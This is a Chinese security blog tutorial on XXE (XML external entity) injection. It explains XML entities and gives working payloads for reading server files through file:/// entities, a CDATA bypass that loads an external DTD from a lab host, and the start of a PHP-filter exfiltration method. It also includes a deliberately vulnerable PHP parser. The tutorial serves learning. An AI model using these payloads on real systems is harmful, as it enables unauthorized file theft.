@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Tu3k" />
+<link rel="stylesheet" href="/css/tags.css" media="all">
+
+
+<meta name="description" content="原理 XXE，外部实体注入，是XML注入的一种，当XML允许外部实体时，就可能导致任意文件读取、命令执行、内网端口探测等危险问题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞详解">
+<meta property="og:url" content="https://www.tu3k.cn/2021/03/14/xxe-bug/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="原理 XXE，外部实体注入，是XML注入的一种，当XML允许外部实体时，就可能导致任意文件读取、命令执行、内网端口探测等危险问题。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615635780262-cd2eedf7-fef3-431e-a3d1-0af477f04d04.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615635769318-7be0aee2-e26a-4f21-994b-1e7ffc4ed0aa.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615692473652-9e7b4bfe-4eb3-419c-b900-d0d7faad554c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615692887841-4687ff15-1847-4787-9ef6-399d3236eaca.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615694317234-e2d6b4cd-bede-49ae-937e-29e9ae0e9ea1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615694904794-b4661452-8da5-429c-a601-af6b2d689790.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615694996677-d887a051-93cd-4a73-b1fe-73caf4cfdf51.png?x-oss-process=image/resize,w_1358">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615695017750-f4c68f3e-541b-4454-a596-44dea8010e4d.png?x-oss-process=image/resize,w_1244">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615695288730-7583de5e-ac6a-4480-a448-40611aa9e13c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615696346398-bd83cfd7-62b0-47a5-9e5b-094ebd4b296b.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615703861563-65862cde-38df-4ea7-b980-a4e350e71c4a.png?x-oss-process=image/resize,w_1266">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615703906321-48f42ac4-0222-4ef2-9659-bd000b311e24.png?x-oss-process=image/resize,w_762">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615704030936-0aabf1d5-ee77-4a0f-841b-9d9b80a48bf8.png?x-oss-process=image/resize,w_908">
+<meta property="article:published_time" content="2021-03-14T08:31:29.000Z">
+<meta property="article:modified_time" content="2021-03-14T08:35:00.877Z">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615635780262-cd2eedf7-fef3-431e-a3d1-0af477f04d04.png">
+
+
+    <link rel="icon" href="/images/favicon.ico">
+  
+
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>XXE漏洞详解 | Tu3k's Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?691d4c8cb59ad2a5d8c46f1ce6268b57";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/images/qq.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">首页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                            <li><a href="/playlist/">那忆年</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 微信" href="#####?rnm####?rnm####?xswl####1119866279" title="微信"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CGI%E7%BC%96%E7%A8%8B/" rel="tag">CGI编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">Frp内网转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ocr/" rel="tag">Ocr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pymysql/" rel="tag">Pymysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python%E5%87%BD%E6%95%B0/" rel="tag">Python函数</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python%E6%AD%A3%E5%88%99/" rel="tag">Python正则</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python%E7%AC%94%E8%AE%B0/" rel="tag">Python笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ueditor%E6%BC%8F%E6%B4%9E/" rel="tag">Ueditor漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dll%E5%8A%AB%E6%8C%81/" rel="tag">dll劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flash%E9%92%93%E9%B1%BC/" rel="tag">flash钓鱼</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kerberos/" rel="tag">kerberos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-mysql/" rel="tag">python_mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socket/" rel="tag">socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/" rel="tag">内网漫游</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E7%89%88%E7%A4%BE%E6%BC%8F%E6%B4%9E/" rel="tag">出版社漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/" rel="tag">多线程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">教育系统 漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%9F%E5%A4%967i24%E6%8F%90%E6%9D%83/" rel="tag">星外7i24提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%A7%E6%89%BF/" rel="tag">继承</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90/" rel="tag">维持权限</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%AA%91%E5%A3%ABCMS-Getshell/" rel="tag">骑士CMS Getshell</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.tu3k.cn">吃可爱存活的博客</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">博客就是记录平常学习的笔记和操作，以及最新漏洞的复现，写成文章增加记忆力和动手能力[小博主真的菜]。生活很苦，但你要努力，加油，追梦人。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/images/qq.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">首页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                    <li><a href="/playlist/">那忆年</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 微信" target="_blank" href="#####?rnm####?rnm####?xswl####1119866279" title="微信"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-xxe-bug" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/03/14/xxe-bug/" class="article-date">
+      <time datetime="2021-03-14T08:31:29.000Z" itemprop="datePublished">2021-03-14</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XXE漏洞详解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+<div class="article-entry" itemprop="articleBody">
+    
+        
+        <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p>XXE，外部实体注入，是XML注入的一种，当XML允许外部实体时，就可能导致任意文件读取、命令执行、内网端口探测等危险问题。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="服务端XML函数了解"><a href="#服务端XML函数了解" class="headerlink" title="服务端XML函数了解"></a>服务端XML函数了解</h2><h3 id="PHP解析处理XML函数"><a href="#PHP解析处理XML函数" class="headerlink" title="PHP解析处理XML函数"></a>PHP解析处理XML函数</h3><p>simplexml_load_string()<br>转换正常的XML字符串为SimpleXmlElement对象，返回所有对象的键和元素到变量中，[return object]。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 普通方式操控解析xml</span><br><span class="line">$xml &#x3D; &lt;&lt;&lt;XML</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;baicai&lt;&#x2F;to&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line">XML;</span><br><span class="line">$xmlobj &#x3D; simplexml_load_string($xml)</span><br><span class="line">echo $xmlobj-&gt;getname();	   &#x2F;&#x2F;获取xml根元素名称  note</span><br><span class="line">echo $xmlobj-&gt;to;	          &#x2F;&#x2F; 直接获取xml元素内to键名的值  baicai</span><br><span class="line">&#x2F;&#x2F; dom对象操控解析xml</span><br><span class="line">$dom &#x3D; new DOMDocument();	&#x2F;&#x2F;使用xml操作时需创建domdocument对象</span><br><span class="line">$dom-&gt;loadxml(&#39;test.xml&#39;);            &#x2F;&#x2F; 载入xml文件到内存中并设置些属性</span><br><span class="line">$c &#x3D; simplexml_import_dom($dom);    &#x2F;&#x2F; 解析xml文件并把结果给$c</span><br><span class="line">print($c);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615635780262-cd2eedf7-fef3-431e-a3d1-0af477f04d04.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615635769318-7be0aee2-e26a-4f21-994b-1e7ffc4ed0aa.png" alt="image.png"></p>
+<h2 id="XML代码结构"><a href="#XML代码结构" class="headerlink" title="XML代码结构"></a>XML代码结构</h2><h3 id="XML标签功能了解"><a href="#XML标签功能了解" class="headerlink" title="XML标签功能了解"></a>XML标签功能了解</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">info</span> [							//定义根元素为info</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">info</span> <span class="meta-keyword">ANY</span> &gt;</span>					// ANY 表示可以接收所有参数为根元素下的子元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>				// 设置子元素的一些属性</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">age</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>										//闭合根元素</span><br><span class="line"><span class="tag">&lt;<span class="name">info</span>&gt;</span>					// 一一对应上面定义的根元素</span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>tu3k<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">age</span>&gt;</span>14<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">info</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">info</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-string">&quot;baicai&quot;</span>&gt;</span>						// !ENTITY	类似于定义一个变量为name的值为baicai，在xml中实体引用即可</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">info</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>14<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="内部实体和外部实体"><a href="#内部实体和外部实体" class="headerlink" title="内部实体和外部实体"></a>内部实体和外部实体</h3><p>1、<!ENTITY name "baicai"> 这就是内部实体，通过内部自己定义的变量内容<br>2、外部实体，通过SYSTEM方法引入外部文件 (优点：方便调用修改数据内容)<br>例：<br>file:///C:/Windows/win.ini 换成其他文件即任意文件内容读取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">team</span>&gt;</span>nbfe<span class="tag">&lt;/<span class="name">team</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h3><p>通用实体在创建实体名时 前面要加 %<br><code> &lt;!ENTITY % name SYSTEM &quot;xxx.dtd&quot;&gt;</code></p>
+<p>一般只有出现引用dtd文件时才会用到通用实体<br>实体调用</p>
+<blockquote>
+<note>
+%name;
+</note>
+</blockquote>
+<h2 id="XML——XXE漏洞示例"><a href="#XML——XXE漏洞示例" class="headerlink" title="XML——XXE漏洞示例"></a>XML——XXE漏洞示例</h2><h3 id="XML注入读取文件-示例1：最基本的读取文件"><a href="#XML注入读取文件-示例1：最基本的读取文件" class="headerlink" title="XML注入读取文件 示例1：最基本的读取文件"></a>XML注入读取文件 示例1：最基本的读取文件</h3><p>服务端代码：</p>
+<blockquote>
+<p>加载POST进来的代码进行XML载入解析并将结果输出到页面</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// read-file.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">	<span class="variable">$xml</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> Domdocument();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;loadxml(<span class="variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$d</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">	print_r(<span class="variable">$d</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">	&lt;!DOCTYPE foo [		<span class="comment">// 设置根元素，类似于html中的&lt;body&gt;</span></span><br><span class="line">	&lt;!ENTITY eee SYSTEM <span class="string">&quot;file:///E:/2.txt&quot;</span>&gt;		<span class="comment">// SYSTEM 设置外部引用资源</span></span><br><span class="line">	]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;eee;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615692473652-9e7b4bfe-4eb3-419c-b900-d0d7faad554c.png" alt="image.png"></p>
+<h3 id="XML注入读取文件-示例2：当文件存在特殊字符无法正常读取"><a href="#XML注入读取文件-示例2：当文件存在特殊字符无法正常读取" class="headerlink" title="XML注入读取文件 示例2：当文件存在特殊字符无法正常读取"></a>XML注入读取文件 示例2：当文件存在特殊字符无法正常读取</h3><p>服务端代码如上。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615692887841-4687ff15-1847-4787-9ef6-399d3236eaca.png" alt="image.png"><br>当文件内容存在特殊的字符，无法被xml解析读出，这时候需用到 CDATA 标签方法进行绕过<br>标签格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA [</span><br><span class="line">XXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>
+<p>XXXX为文件路径，即用到三个实体变量，最后将其拼接一起在xml代码中返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY start &quot;&lt;![CDATA [&quot;&gt;            &#x2F;&#x2F; CDATA 标签开头</span><br><span class="line">&lt;!ENTITY string SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;E:&#x2F;1.txt&quot;&gt;     &#x2F;&#x2F; 之间读取的数据内容都解析为正常字符串</span><br><span class="line">&lt;!ENTITY end &quot;]]&gt;&quot;&gt;                   &#x2F;&#x2F; CDATA 标签闭合</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;</span><br><span class="line">&amp;start;&amp;string;&amp;end;</span><br><span class="line">&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
+<p>理论上是这样的，但是通过发包测试还是无法读取文件内容，所以说<br>XML只接受拼接好的实体变量，我们要创建个dtd文件，在dtd内拼接好后，再在xml代码中引入dtd即可。<br>要引入dtd文件，就要设置通用实体，即 % 实体成员</p>
+<p>dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">&quot;%start;%string;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">yee</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">string</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.235.141/xml/echo.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">  %dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">yee</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">yee</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615694317234-e2d6b4cd-bede-49ae-937e-29e9ae0e9ea1.png" alt="image.png"><br><strong>PS</strong>：服务端代码必须是echo $xml 才能正常读取，重点必须是echo才行，print_r和var_dump()都读不到数据，所以这个很鸡肋，当作了解。<br>p2：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615694904794-b4661452-8da5-429c-a601-af6b2d689790.png" alt="image.png"></p>
+<p>**</p>
+<h3 id="XML注入读取文件-示例3：使用PHP伪协议和外带读取文件内容（针对无回显，常用）"><a href="#XML注入读取文件-示例3：使用PHP伪协议和外带读取文件内容（针对无回显，常用）" class="headerlink" title="XML注入读取文件 示例3：使用PHP伪协议和外带读取文件内容（针对无回显，常用）"></a>XML注入读取文件 示例3：使用PHP伪协议和外带读取文件内容（针对无回显，常用）</h3><h4 id="1、一些特殊文件无法读取，使用-lt-CDATA-也绕过不了，可以在-lt-CDATA-中加入PHP伪协议的base64编码读取"><a href="#1、一些特殊文件无法读取，使用-lt-CDATA-也绕过不了，可以在-lt-CDATA-中加入PHP伪协议的base64编码读取" class="headerlink" title="1、一些特殊文件无法读取，使用 &lt;![CDATA [ 也绕过不了，可以在&lt;![CDATA [ 中加入PHP伪协议的base64编码读取"></a>1、一些特殊文件无法读取，使用 &lt;![CDATA [ 也绕过不了，可以在&lt;![CDATA [ 中加入PHP伪协议的base64编码读取</h4><blockquote>
+<p>php://filter/convert.base64-encode/base64-encode/resource=E:/3.php</p>
+</blockquote>
+<p>Payload：</p>
